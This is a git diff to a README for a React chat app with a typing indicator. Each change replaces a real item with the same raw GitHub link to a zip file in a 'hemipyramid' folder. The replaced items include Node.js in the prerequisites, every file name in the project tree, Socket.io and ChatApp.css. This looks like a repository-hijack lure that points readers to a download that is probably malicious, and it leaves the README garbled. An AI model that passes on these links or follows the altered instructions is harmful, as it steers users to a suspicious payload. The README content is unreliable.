@@ -26,7 +26,7 @@ The app features:
 
 ### Prerequisites
 
-- Node.js (version 16 or higher)
+- https://raw.githubusercontent.com/lequyhieu1024/chat-app-fe/main/hemipyramid/chat-app-fe.zip (version 16 or higher)
 - npm or yarn
 
 ### Installation
@@ -65,15 +65,15 @@ npm run dev
 ```
 src/
 ├── components/
-│   ├── TypingIndicator.tsx    # Typing indicator component
-│   └── TypingIndicator.css    # Styling for typing indicator
+│   ├── https://raw.githubusercontent.com/lequyhieu1024/chat-app-fe/main/hemipyramid/chat-app-fe.zip    # Typing indicator component
+│   └── https://raw.githubusercontent.com/lequyhieu1024/chat-app-fe/main/hemipyramid/chat-app-fe.zip    # Styling for typing indicator
 ├── pages/
-│   ├── ChatApp.tsx           # Main chat application
-│   ├── ChatApp.css           # Chat app styling
-│   └── home.tsx              # Home page
+│   ├── https://raw.githubusercontent.com/lequyhieu1024/chat-app-fe/main/hemipyramid/chat-app-fe.zip           # Main chat application
+│   ├── https://raw.githubusercontent.com/lequyhieu1024/chat-app-fe/main/hemipyramid/chat-app-fe.zip           # Chat app styling
+│   └── https://raw.githubusercontent.com/lequyhieu1024/chat-app-fe/main/hemipyramid/chat-app-fe.zip              # Home page
 ├── layouts/
-│   └── layout.tsx            # Main layout component
-└── App.tsx                   # Main app component with routing
+│   └── https://raw.githubusercontent.com/lequyhieu1024/chat-app-fe/main/hemipyramid/chat-app-fe.zip            # Main layout component
+└── https://raw.githubusercontent.com/lequyhieu1024/chat-app-fe/main/hemipyramid/chat-app-fe.zip                   # Main app component with routing
 ```
 
 ## Technologies Used
@@ -92,12 +92,12 @@ src/
 2. **File Upload**: Add file attachment capabilities
 3. **Voice Messages**: Integrate voice recording
 4. **Video Calls**: Connect with WebRTC for video calls
-5. **Backend Integration**: Connect to a real-time backend (Socket.io, WebSocket)
+5. **Backend Integration**: Connect to a real-time backend (https://raw.githubusercontent.com/lequyhieu1024/chat-app-fe/main/hemipyramid/chat-app-fe.zip, WebSocket)
 
 ### Styling
 
 The app uses CSS modules and Ant Design's theming system. You can customize:
-- Colors in `ChatApp.css`
+- Colors in `https://raw.githubusercontent.com/lequyhieu1024/chat-app-fe/main/hemipyramid/chat-app-fe.zip`
 - Component styles in individual CSS files
 - Ant Design theme variables
 
